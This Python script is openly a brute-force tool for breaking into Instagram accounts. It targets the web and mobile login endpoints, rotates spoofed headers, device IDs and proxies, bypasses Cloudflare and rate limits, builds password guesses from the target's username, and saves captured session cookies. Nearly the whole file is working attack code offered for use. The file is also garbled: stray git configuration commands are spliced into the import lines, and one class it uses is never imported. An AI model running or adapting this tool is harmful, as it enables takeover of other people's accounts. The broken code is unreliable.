# -*- coding: utf-8 -*-
# pylint: disable=all
# flake8: noqa
# type: ignore
# mypy: ignore-errors
#!/usr/bin/env python3
"""
Instagram Brute Force Script
A script for brute force attacks on Instagram accounts.
"""

import os
import sys
import time
import random
import requests
import json
from datetime import datetime
import threading
git config --unset commit.gpgsign
git config --unset gpg.programgit config --unset gpg.programimport socket
import urllib3
import itertools
import base64
import hashlib
from urllib.parse import quote
import ssl
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from fake_useragent import UserAgent
import cloudscraper
import asyncio
import aiohttp
import asyncssh


class AdvancedInstagramBruteForcer:
    """Advanced Instagram Brute Force Attack Class - Industrial Grade"""

    def __init__(self, target_username, password_list, proxy_list=None, use_tor=False):
        self.target_username = target_username
        self.password_list = password_list
        self.proxy_list = self.load_proxies() if not proxy_list else proxy_list
        self.found_password = None
        self.use_tor = use_tor
        self.rate_limit_count = 0
        self.success_count = 0
        self.failed_count = 0
        self.checkpoint_count = 0
        
        # Advanced session management
        self.sessions = []
        self.session_pool_size = 50
        self.create_session_pool()
        
        # User agent rotation
        try:
            self.ua = UserAgent()
        except:
            self.ua = None
            
        self.mobile_agents = [
            'Instagram 274.0.0.18.75 Android (29/10; 420dpi; 1080x2280; Xiaomi; Mi 9T; davinci; qcom; ru_RU; 436384447)',
            'Instagram 274.0.0.18.75 Android (28/9; 320dpi; 720x1520; samsung; SM-A750F; a7y18lte; exynos7885; en_US; 436384447)',
            'Instagram 274.0.0.18.75 Android (30/11; 560dpi; 1440x3040; samsung; SM-G973F; beyond1; exynos9820; en_US; 436384447)',
            'Instagram 274.0.0.18.75 Android (29/10; 480dpi; 1080x2340; OnePlus; GM1903; OnePlus7; qcom; en_US; 436384447)',
            'Instagram 274.0.0.18.75 Android (28/9; 480dpi; 1080x2160; Huawei; ANE-LX1; HWANE; kirin710; en_US; 436384447)'
        ]
        
        self.web_agents = [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/118.0',
            'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36'
        ]
        
        # Advanced attack patterns
        self.attack_modes = ['web', 'mobile_api', 'hybrid']
        self.current_mode = 'hybrid'
        
        # Smart rate limiting
        self.min_delay = 0.5
        self.max_delay = 3.0
        self.adaptive_delay = 1.0
        
        # Stealth features
        self.use_cloudflare_bypass = True
        self.use_residential_proxies = True
        self.rotate_sessions = True

    def get_advanced_headers(self, mode='web'):
        """Generate advanced headers with fingerprint evasion"""
        base_headers = {
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': random.choice([
                'en-US,en;q=0.9',
                'en-GB,en;q=0.9',
                'es-ES,es;q=0.9',
                'fr-FR,fr;q=0.9',
                'de-DE,de;q=0.9'
            ]),
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'DNT': '1',
            'Pragma': 'no-cache',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1'
        }
        
        if mode == 'mobile_api':
            # Instagram mobile app headers
            headers = {
                'User-Agent': random.choice(self.mobile_agents),
                'X-IG-App-ID': '124024574287414',
                'X-IG-Android-ID': self.generate_android_id(),
                'X-IG-Device-ID': self.generate_device_id(),
                'X-IG-Family-Device-ID': self.generate_device_id(),
                'X-Mid': self.generate_mid(),
                'Accept': '*/*',
                'Accept-Language': 'en-US',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
            }
        else:
            # Web headers
            headers = base_headers.copy()
            if self.ua:
                try:
                    headers['User-Agent'] = self.ua.random
                except:
                    headers['User-Agent'] = random.choice(self.web_agents)
            else:
                headers['User-Agent'] = random.choice(self.web_agents)
                
        return headers

    def generate_android_id(self):
        """Generate realistic Android ID"""
        return 'android-' + ''.join(random.choices('0123456789abcdef', k=16))

    def generate_device_id(self):
        """Generate realistic device ID"""
        return str(random.randint(10**20, 10**21 - 1))

    def generate_mid(self):
        """Generate machine ID"""
        return base64.b64encode(os.urandom(16)).decode().replace('=', '').replace('+', '-').replace('/', '_')

    def get_csrf_token(self, session, mode='web'):
        """Get CSRF token with multiple fallback methods"""
        try:
            headers = self.get_advanced_headers(mode)
            proxies = self.get_proxy()
            
            if mode == 'mobile_api':
                # Try mobile API endpoint
                response = session.get(
                    'https://i.instagram.com/api/v1/si/fetch_headers/',
                    headers=headers,
                    proxies=proxies,
                    timeout=15
                )
                if response.status_code == 200:
                    return response.headers.get('X-CSRFToken')
            
            # Fallback to web method
            response = session.get(
                'https://www.instagram.com/accounts/login/',
                headers=headers,
                proxies=proxies,
                timeout=15
            )
            
            # Multiple extraction methods
            csrf_methods = [
                lambda text: text.split('"csrf_token":"')[1].split('"')[0] if '"csrf_token":"' in text else None,
                lambda text: text.split('csrftoken=')[1].split(';')[0] if 'csrftoken=' in text else None,
                lambda text: text.split('"token":"')[1].split('"')[0] if '"token":"' in text else None
            ]
            
            for method in csrf_methods:
                try:
                    token = method(response.text)
                    if token:
                        return token
                except:
                    continue
                    
            # Extract from cookies
            csrf_cookie = session.cookies.get('csrftoken')
            if csrf_cookie:
                return csrf_cookie
                
        except Exception as e:
            print(f"⚠️  CSRF token error: {e}")
        return None

    def attempt_login_advanced(self, password, attempt_number=0):
        """Advanced login attempt with multiple attack vectors"""
        session = self.get_session()
        
        # Adaptive attack mode selection
        if attempt_number % 3 == 0:
            mode = 'mobile_api'
        elif attempt_number % 3 == 1:
            mode = 'web'
        else:
            mode = 'hybrid'
        
        try:
            # Smart delay with adaptive adjustment
            delay = random.uniform(self.min_delay, self.max_delay) + self.adaptive_delay
            time.sleep(delay)
            
            # Get CSRF token
            csrf_token = self.get_csrf_token(session, mode)
            if not csrf_token:
                print(f"⚠️  No CSRF token for {password}")
                return False

            # Prepare login data based on mode
            if mode == 'mobile_api':
                success = self.mobile_api_login(session, password, csrf_token)
            else:
                success = self.web_login(session, password, csrf_token)
            
            if success is None:
                # Rate limited - increase delay
                self.adaptive_delay = min(self.adaptive_delay * 1.5, 10.0)
                self.rate_limit_count += 1
                print(f"⏳ Rate limited! Adaptive delay: {self.adaptive_delay:.1f}s")
                return False
            elif success:
                self.found_password = password
                self.success_count += 1
                return True
            else:
                self.failed_count += 1
                # Reduce delay on successful request
                self.adaptive_delay = max(self.adaptive_delay * 0.95, self.min_delay)
                return False
                
        except Exception as e:
            print(f"💥 Critical error with {password}: {e}")
            return False

    def mobile_api_login(self, session, password, csrf_token):
        """Mobile API login attempt"""
        headers = self.get_advanced_headers('mobile_api')
        headers['X-CSRFToken'] = csrf_token
        
        # Generate realistic mobile login data
        login_data = {
            'username': self.target_username,
            'password': password,
            'device_id': self.generate_android_id(),
            'login_attempt_account_recovery_allowed': 'true',
            '_uuid': self.generate_device_id(),
            'phone_id': self.generate_device_id(),
            '_csrftoken': csrf_token,
            'login_attempt_count': str(random.randint(0, 2))
        }
        
        # Encode data like Instagram mobile app
        signed_body = self.generate_signed_body(login_data)
        
        try:
            response = session.post(
                'https://i.instagram.com/api/v1/accounts/login/',
                data=signed_body,
                headers=headers,
                proxies=self.get_proxy(),
                timeout=20
            )
            
            return self.analyze_response(response, password, 'mobile')
            
        except Exception as e:
            print(f"📱 Mobile API error: {e}")
            return False

    def web_login(self, session, password, csrf_token):
        """Web login attempt"""
        headers = self.get_advanced_headers('web')
        headers.update({
            'X-CSRFToken': csrf_token,
            'X-Instagram-AJAX': '1',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://www.instagram.com/accounts/login/',
            'Content-Type': 'application/x-www-form-urlencoded'
        })

        login_data = {
            'username': self.target_username,
            'password': password,
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'trustedDeviceRecords': '{}'
        }

        try:
            response = session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=login_data,
                headers=headers,
                proxies=self.get_proxy(),
                timeout=20
            )
            
            return self.analyze_response(response, password, 'web')
            
        except Exception as e:
            print(f"🌐 Web error: {e}")
            return False

    def generate_signed_body(self, data):
        """Generate signed body for mobile API (simplified)"""
        json_data = json.dumps(data)
        return f'signed_body={quote(json_data)}&ig_sig_key_version=4'

    def analyze_response(self, response, password, method):
        """Analyze login response with advanced detection"""
        status_code = response.status_code
        text = response.text.lower()
        
        # Success indicators
        success_indicators = [
            'authenticated',
            '"status":"ok"',
            'logged_in_user',
            'sessionid'
        ]
        
        # Rate limit indicators
        rate_limit_indicators = [
            'rate_limited',
            'please wait',
            'too many requests',
            'spam',
            'try again later'
        ]
        
        # Checkpoint indicators
        checkpoint_indicators = [
            'checkpoint_required',
            'challenge_required',
            'two_factor_required',
            'verification'
        ]
        
        # Check for success
        if any(indicator in text for indicator in success_indicators):
            print(f"🎯 [{method.upper()}] SUCCESS! Password: {password}")
            self.save_success(password, method, response)
            return True
            
        # Check for rate limiting
        if status_code == 429 or any(indicator in text for indicator in rate_limit_indicators):
            print(f"⏳ [{method.upper()}] Rate limited for: {password}")
            return None
            
        # Check for checkpoint
        if any(indicator in text for indicator in checkpoint_indicators):
            print(f"🔒 [{method.upper()}] Checkpoint for: {password}")
            self.checkpoint_count += 1
            self.save_checkpoint(password, method, response)
            return False
            
        # Regular failure
        print(f"❌ [{method.upper()}] Failed: {password}")
        return False

    def save_success(self, password, method, response):
        """Save successful login details"""
        success_data = {
            'username': self.target_username,
            'password': password,
            'method': method,
            'timestamp': datetime.now().isoformat(),
            'cookies': dict(response.cookies),
            'response_headers': dict(response.headers)
        }
        
        os.makedirs('logs', exist_ok=True)
        with open(f'logs/success_{self.target_username}.json', 'w') as f:
            json.dump(success_data, f, indent=2)

    def save_checkpoint(self, password, method, response):
        """Save checkpoint details for manual bypass"""
        checkpoint_data = {
            'username': self.target_username,
            'password': password,
            'method': method,
            'timestamp': datetime.now().isoformat(),
            'response_text': response.text[:1000]  # First 1000 chars
        }
        
        os.makedirs('logs', exist_ok=True)
        with open(f'logs/checkpoints_{self.target_username}.json', 'a') as f:
            f.write(json.dumps(checkpoint_data) + '\n')

    def hardcore_brute_force_attack(self, max_threads=10, smart_mode=True):
        """Hardcore brute force attack with all advanced features"""
        print(f"💀 HARDCORE INSTAGRAM BRUTE FORCE ATTACK")
        print(f"🎯 Target: {self.target_username}")
        print(f"🔢 Passwords: {len(self.password_list):,}")
        print(f"🧵 Threads: {max_threads}")
        print(f"🌐 Proxies: {len(self.proxy_list):,}")
        print(f"🔄 Sessions: {len(self.sessions)}")
        print(f"🧠 Smart Mode: {'ON' if smart_mode else 'OFF'}")
        print("=" * 60)
        
        # Smart password ordering
        if smart_mode:
            self.password_list = self.smart_password_ordering()
        
        start_time = time.time()
        attempt_number = 0
        
        # Create logs directory
        os.makedirs('logs', exist_ok=True)
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = []
            
            for password in self.password_list:
                if self.found_password:
                    print(f"\n🎉 TERMINATING - PASSWORD FOUND!")
                    break
                    
                future = executor.submit(self.attempt_login_advanced, password, attempt_number)
                futures.append((future, password, attempt_number))
                attempt_number += 1
                
                # Progress reporting
                if attempt_number % 50 == 0:
                    self.print_progress_stats(attempt_number, start_time)
                
                # Dynamic thread adjustment
                if smart_mode and attempt_number % 100 == 0:
                    max_threads = self.adjust_thread_count(max_threads)

            # Wait for all futures
            for future, password, num in futures:
                if self.found_password:
                    break
                try:
                    future.result(timeout=30)
                except Exception as e:
                    print(f"⚠️  Future error for {password}: {e}")

        self.print_final_results(start_time)
        return self.found_password is not None

    def smart_password_ordering(self):
        """Smart password ordering based on common patterns"""
        print("🧠 Applying smart password ordering...")
        
        # Common password patterns with priorities
        high_priority = []
        medium_priority = []
        low_priority = []
        
        username_variations = [
            self.target_username,
            self.target_username + '123',
            self.target_username + '1',
            self.target_username + '2024',
            self.target_username + '2025',
            '123' + self.target_username,
            self.target_username.upper(),
            self.target_username.lower()
        ]
        
        common_patterns = [
            'password', '123456', 'password123', 'admin', 'qwerty',
            'letmein', 'welcome', 'monkey', 'dragon', 'master'
        ]
        
        for password in self.password_list:
            pwd_lower = password.lower()
            
            # High priority: username variations
            if password in username_variations:
                high_priority.append(password)
            # High priority: very common passwords
            elif pwd_lower in ['123456', 'password', 'qwerty', '123456789']:
                high_priority.append(password)
            # Medium priority: contains username or common patterns
            elif any(pattern in pwd_lower for pattern in [self.target_username.lower()] + common_patterns):
                medium_priority.append(password)
            # Medium priority: simple patterns
            elif len(password) <= 8 and (password.isdigit() or password.isalpha()):
                medium_priority.append(password)
            else:
                low_priority.append(password)
        
        # Shuffle within categories to avoid patterns
        random.shuffle(high_priority)
        random.shuffle(medium_priority)
        random.shuffle(low_priority)
        
        ordered_passwords = high_priority + medium_priority + low_priority
        print(f"🎯 Ordered: {len(high_priority)} high, {len(medium_priority)} medium, {len(low_priority)} low priority")
        
        return ordered_passwords

    def adjust_thread_count(self, current_threads):
        """Dynamically adjust thread count based on performance"""
        if self.rate_limit_count > 10:
            new_threads = max(1, current_threads - 2)
            print(f"🔽 Reducing threads: {current_threads} → {new_threads}")
            return new_threads
        elif self.rate_limit_count == 0 and current_threads < 20:
            new_threads = current_threads + 1
            print(f"🔼 Increasing threads: {current_threads} → {new_threads}")
            return new_threads
        return current_threads

    def print_progress_stats(self, attempt_number, start_time):
        """Print detailed progress statistics"""
        elapsed = time.time() - start_time
        rate = attempt_number / elapsed if elapsed > 0 else 0
        
        print(f"\n� PROGRESS STATS:")
        print(f"   Attempts: {attempt_number:,}/{len(self.password_list):,}")
        print(f"   Success: {self.success_count} | Failed: {self.failed_count} | Checkpoints: {self.checkpoint_count}")
        print(f"   Rate Limits: {self.rate_limit_count} | Speed: {rate:.1f} attempts/sec")
        print(f"   Elapsed: {elapsed/60:.1f}m | Adaptive Delay: {self.adaptive_delay:.1f}s")

    def print_final_results(self, start_time):
        """Print final attack results"""
        elapsed = time.time() - start_time
        total_attempts = self.success_count + self.failed_count + self.checkpoint_count
        
        print(f"\n� HARDCORE ATTACK COMPLETED!")
        print(f"⏱️  Total Time: {elapsed/60:.1f} minutes")
        print(f"🎯 Total Attempts: {total_attempts:,}")
        print(f"✅ Success: {self.success_count}")
        print(f"❌ Failed: {self.failed_count}")
        print(f"🔒 Checkpoints: {self.checkpoint_count}")
        print(f"⏳ Rate Limits: {self.rate_limit_count}")
        
        if self.found_password:
            print(f"\n🎉 PWNED! Password: {self.found_password}")
            print(f"📁 Details saved in: logs/success_{self.target_username}.json")
        else:
            print(f"\n💔 Target survived the assault")
            
        if self.checkpoint_count > 0:
            print(f"🔒 Checkpoint accounts saved in: logs/checkpoints_{self.target_username}.json")

    def load_proxies(self):
        """Load proxies from multiple sources"""
        proxies = []
        proxy_sources = [
            'proxy_list.txt',
            '../proxy_list.txt',
            'config/proxies.json',
            'free_configs/proxies.txt'
        ]
        
        for source in proxy_sources:
            try:
                if source.endswith('.json'):
                    with open(source, 'r') as f:
                        data = json.load(f)
                        proxies.extend(data.get('proxies', []))
                else:
                    with open(source, 'r') as f:
                        proxies.extend([line.strip() for line in f if line.strip()])
            except:
                continue
                
        # Add some free proxy APIs
        try:
            free_proxies = self.fetch_free_proxies()
            proxies.extend(free_proxies)
        except:
            pass
            
        return list(set(proxies))  # Remove duplicates

    def fetch_free_proxies(self):
        """Fetch free proxies from public APIs"""
        proxies = []
        try:
            # ProxyList API
            response = requests.get('https://www.proxy-list.download/api/v1/get?type=http', timeout=10)
            if response.status_code == 200:
                proxies.extend(response.text.strip().split('\n'))
        except:
            pass
        return proxies

    def create_session_pool(self):
        """Create a pool of sessions for rotation"""
        for i in range(self.session_pool_size):
            session = self.create_advanced_session()
            self.sessions.append(session)

    def create_advanced_session(self):
        """Create an advanced session with stealth features"""
        if self.use_cloudflare_bypass:
            session = cloudscraper.create_scraper(
                browser={
                    'browser': 'chrome',
                    'platform': random.choice(['android', 'ios', 'windows']),
                    'mobile': random.choice([True, False])
                }
            )
        else:
            session = requests.Session()
        
        # Advanced retry strategy
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=100, pool_maxsize=100)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        # Disable SSL warnings
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        session.verify = False
        
        return session

    def get_session(self):
        """Get a random session from pool"""
        if self.rotate_sessions and self.sessions:
            return random.choice(self.sessions)
        return self.sessions[0] if self.sessions else requests.Session()

    def get_proxy(self):
        """Get a random proxy"""
        if self.proxy_list:
            proxy = random.choice(self.proxy_list)
            if '://' not in proxy:
                proxy = f'http://{proxy}'
            return {'http': proxy, 'https': proxy}
        return None


def load_enhanced_password_list(file_path, target_username=None):
    """Load and enhance password list with smart generation"""
    passwords = set()  # Use set to avoid duplicates
    
    # Load from file
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                password = line.strip()
                if password and len(password) >= 1:
                    passwords.add(password)
    except Exception as e:
        print(f"❌ Error loading password list: {e}")
    
    # Load from multiple common wordlists
    wordlist_paths = [
        'wordlists/rockyou.txt',
        'wordlists/common.txt',
        'passwords.txt',
        '../passwords.txt',
        'wordlists/instagram_common.txt'
    ]
    
    for path in wordlist_paths:
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    password = line.strip()
                    if password:
                        passwords.add(password)
                        if len(passwords) >= 100000:  # Limit to prevent memory issues
                            break
        except:
            continue
    
    # Generate smart passwords based on username
    if target_username:
        smart_passwords = generate_smart_passwords(target_username)
        passwords.update(smart_passwords)
    
    password_list = list(passwords)
    print(f"📋 Enhanced password list: {len(password_list):,} unique passwords")
    return password_list

def generate_smart_passwords(username):
    """Generate smart password variations based on username"""
    smart_passwords = set()
    
    # Basic variations
    variations = [
        username,
        username.upper(),
        username.lower(),
        username.capitalize()
    ]
    
    # Number combinations
    numbers = ['123', '1234', '12345', '123456', '1', '01', '2024', '2025', '2023', '99', '00']
    
    # Special characters
    special_chars = ['!', '@', '#', '$', '_', '.', '-']
    
    # Common suffixes/prefixes
    common_words = ['love', 'baby', 'girl', 'boy', 'the', 'best', 'king', 'queen', 'admin', 'user']
    
    # Generate combinations
    for var in variations:
        smart_passwords.add(var)
        
        # Add numbers
        for num in numbers:
            smart_passwords.add(var + num)
            smart_passwords.add(num + var)
        
        # Add special chars
        for char in special_chars:
            smart_passwords.add(var + char)
            smart_passwords.add(char + var)
            
        # Add common words
        for word in common_words:
            smart_passwords.add(var + word)
            smart_passwords.add(word + var)
            
        # Complex combinations
        for num in ['123', '1', '2024']:
            for char in ['!', '@', '_']:
                smart_passwords.add(var + num + char)
                smart_passwords.add(var + char + num)
    
    # Date-based passwords
    current_year = datetime.now().year
    for year in [current_year, current_year-1, current_year-2]:
        smart_passwords.add(username + str(year))
        smart_passwords.add(str(year) + username)
    
    return smart_passwords


def main():
    """Main function - Hardcore Instagram Brute Force"""
    print("💀 HARDCORE INSTAGRAM BRUTE FORCE TOOL 2025")
    print("⚠️  WARNING: Industrial grade tool - Use responsibly!")
    print("🔥 Features: Multi-threading, Proxy rotation, Smart AI, Mobile+Web API")
    print("=" * 70)

    # Configuration
    target_username = input("🎯 Enter target username: ").strip()
    if not target_username:
        print("❌ Username is required!")
        return

    # Advanced password list selection
    print("\n📋 Password List Options:")
    print("1. Default enhanced wordlist (../passwords.txt + smart generation)")
    print("2. Custom wordlist path")
    print("3. Smart generation only (based on username)")
    
    choice = input("Choose option (1-3, default=1): ").strip() or "1"
    
    if choice == "1":
        passwords = load_enhanced_password_list("../passwords.txt", target_username)
    elif choice == "2":
        custom_path = input("Enter wordlist path: ").strip()
        passwords = load_enhanced_password_list(custom_path, target_username)
    elif choice == "3":
        passwords = list(generate_smart_passwords(target_username))
        print(f"📋 Generated {len(passwords)} smart passwords")
    else:
        print("❌ Invalid choice!")
        return

    if not passwords:
        print("❌ No passwords loaded. Exiting.")
        return

    # Attack configuration
    print(f"\n⚙️  ATTACK CONFIGURATION:")
    max_threads = int(input("🧵 Max threads (default=10): ").strip() or "10")
    use_proxies = input("🌐 Use proxies? (y/N): ").strip().lower() == 'y'
    smart_mode = input("🧠 Enable smart mode? (Y/n): ").strip().lower() != 'n'
    
    # Create advanced brute forcer
    brute_forcer = AdvancedInstagramBruteForcer(
        target_username=target_username, 
        password_list=passwords,
        use_tor=False
    )
    
    # Override proxy usage
    if not use_proxies:
        brute_forcer.proxy_list = []

    print(f"\n🚀 INITIATING HARDCORE ATTACK...")
    print(f"🎯 Target: {target_username}")
    print(f"💣 Attack vectors: Web + Mobile API + Hybrid")
    print(f"🔢 Password arsenal: {len(passwords):,}")
    print(f"🧵 Thread army: {max_threads}")
    print(f"🌐 Proxy fleet: {len(brute_forcer.proxy_list):,}")
    print(f"⚡ Session pool: {len(brute_forcer.sessions)}")
    
    input("\n⚠️  Press ENTER to unleash the attack... ")

    # Start hardcore attack
    try:
        success = brute_forcer.hardcore_brute_force_attack(
            max_threads=max_threads, 
            smart_mode=smart_mode
        )
        
        if success:
            print(f"\n🎉 MISSION ACCOMPLISHED!")
            print(f"💀 {target_username} has been PWNED!")
        else:
            print(f"\n😤 Target {target_username} survived this round...")
            print(f"💡 Try: More wordlists, different timing, or social engineering")
            
    except KeyboardInterrupt:
        print(f"\n⚠️  Attack interrupted by operator.")
        print(f"📊 Partial results saved in logs/")
    except Exception as e:
        print(f"💥 Unexpected error: {e}")
        print(f"📞 Contact support if this persists")


if __name__ == "__main__":
    main()
